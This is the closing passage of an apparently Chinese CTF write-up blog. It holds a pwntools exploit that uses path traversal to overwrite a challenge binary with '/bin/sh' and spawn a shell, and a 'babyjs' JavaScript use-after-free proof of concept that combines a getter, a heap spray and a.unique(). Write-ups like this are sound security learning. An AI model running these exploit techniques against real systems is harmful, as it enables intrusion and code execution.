style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">input filename (max length = 0x30): </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> name</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">input content (max length 0xa0): </span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> open_file</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">name</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">2</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">input filename (max length = 0x30): </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> name</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> edit_file</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">index</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">3</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">input file idx: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">index</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">input content (max length 0xa0): </span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> show_file</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">index</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">4</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">input file idx: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">index</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#758575DD"># os.system("rm ./temp/*")</span><br><span style="color:#DBD7CAEE">input_dirname</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># debug("b *$rebase(0x1AA4)")</span><br><span style="color:#758575DD"># name = b"/"*(0x30)</span><br><span style="color:#DBD7CAEE">name </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">../../../../../../../home/ctf/chall</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">content </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C98A7D77">"</span><br><br><span style="color:#DBD7CAEE">creat_file</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">name</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="babyjs" class="scroll-target"><a href="#babyjs"><code class="hash inline-code">#</code>babyjs</a></h2>
<p>实现 uaf 的 poc，来自 @Tplus 师傅</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#AB5959">let</span><span style="color:#B07D48"> a</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><br><span style="color:#B5695977">    "</span><span style="color:#B56959">A</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><br><span style="color:#B5695977">    "</span><span style="color:#B56959">B</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><br><span style="color:#B5695977">    "</span><span style="color:#B56959">C</span><span style="color:#B5695977">"</span><br><span style="color:#2993a3">]</span><span style="color:#999999">;</span><br><br><span style="color:#B07D48">Object</span><span style="color:#999999">.</span><span style="color:#59873A">defineProperty</span><span style="color:#2993a3">(</span><span style="color:#B07D48">a</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#998418">  configurable</span><span style="color:#999999">:</span><span style="color:#1E754F"> true</span><span style="color:#999999">,</span><br><span style="color:#59873A">  get</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#A0ADA0">    // console.log('getter(0) called on array "a"');</span><br><br><span style="color:#A0ADA0">    // // a.length = 1;</span><br><span style="color:#A0ADA0">    // // gc();</span><br><br><span style="color:#B07D48">    globalThis</span><span style="color:#999999">.</span><span style="color:#B07D48">spray</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#a13865">[</span><span style="color:#a13865">]</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    for</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#AB5959">let</span><span style="color:#B07D48"> i</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#999999"> </span><span style="color:#999999">&#x3C;</span><span style="color:#2F798A"> 500</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#AB5959">++</span><span style="color:#a13865">)</span><span style="color:#999999"> </span><span style="color:#a13865">{</span><br><span style="color:#B07D48">        spray</span><span style="color:#999999">.</span><span style="color:#59873A">push</span><span style="color:#bda437">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">M</span><span style="color:#B5695977">"</span><span style="color:#bda437">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#a13865">}</span><br><span style="color:#A0ADA0">    // // getter 返回原始值 "A"</span><br><span style="color:#1E754F">    return</span><span style="color:#B5695977"> "</span><span style="color:#B56959">B</span><span style="color:#B5695977">"</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#a65e2b">}</span><br><span style="color:#1e754f">}</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#B07D48">console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Calling a.unique()...</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> new_arr</span><span style="color:#999999"> =</span><span style="color:#B07D48"> a</span><span style="color:#999999">.</span><span style="color:#59873A">unique</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#B07D48">console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">a.unique() returned. new_arr is:</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> new_arr</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#B07D48">JSON</span><span style="color:#999999">.</span><span style="color:#59873A">stringify</span><span style="color:#2993a3">(</span><span style="color:#B07D48">new_arr</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">Math</span><span style="color:#999999">.</span><span style="color:#59873A">min</span><span style="color:#2993a3">(</span><span style="color:#B07D48">a</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><br><span style="color:#B07D48">console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Script finished (you likely won't see this).</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#CB7676">let</span><span style="color:#BD976A"> a</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><br><span style="color:#C98A7D77">    "</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><br><span style="color:#C98A7D77">    "</span><span style="color:#C98A7D">B</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><br><span style="color:#C98A7D77">    "</span><span style="color:#C98A7D">C</span><span style="color:#C98A7D77">"</span><br><span style="color:#5eaab5">]</span><span style="color:#666666">;</span><br><br><span style="color:#BD976A">Object</span><span style="color:#666666">.</span><span style="color:#80A665">defineProperty</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">a</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#B8A965">  configurable</span><span style="color:#666666">:</span><span style="color:#4D9375"> true</span><span style="color:#666666">,</span><br><span style="color:#80A665">  get</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#758575DD">    // console.log('getter(0) called on array "a"');</span><br><br><span style="color:#758575DD">    // // a.length = 1;</span><br><span style="color:#758575DD">    // // gc();</span><br><br><span style="color:#BD976A">    globalThis</span><span style="color:#666666">.</span><span style="color:#BD976A">spray</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#d9739f">[</span><span style="color:#d9739f">]</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    for</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#CB7676">let</span><span style="color:#BD976A"> i</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#666666"> </span><span style="color:#666666">&#x3C;</span><span style="color:#4C9A91"> 500</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#CB7676">++</span><span style="color:#d9739f">)</span><span style="color:#666666"> </span><span style="color:#d9739f">{</span><br><span style="color:#BD976A">        spray</span><span style="color:#666666">.</span><span style="color:#80A665">push</span><span style="color:#e6cc77">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">M</span><span style="color:#C98A7D77">"</span><span style="color:#e6cc77">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#d9739f">}</span><br><span style="color:#758575DD">    // // getter 返回原始值 "A"</span><br><span style="color:#4D9375">    return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">B</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span><br><span style="color:#666666">  </span><span style="color:#d4976c">}</span><br><span style="color:#4d9375">}</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#BD976A">console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Calling a.unique()...</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> new_arr</span><span style="color:#666666"> =</span><span style="color:#BD976A"> a</span><span style="color:#666666">.</span><span style="color:#80A665">unique</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#BD976A">console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a.unique() returned. new_arr is:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> new_arr</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#BD976A">JSON</span><span style="color:#666666">.</span><span style="color:#80A665">stringify</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">new_arr</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">Math</span><span style="color:#666666">.</span><span style="color:#80A665">min</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">a</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><br><span style="color:#BD976A">console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Script finished (you likely won't see this).</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br></code></pre></div></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>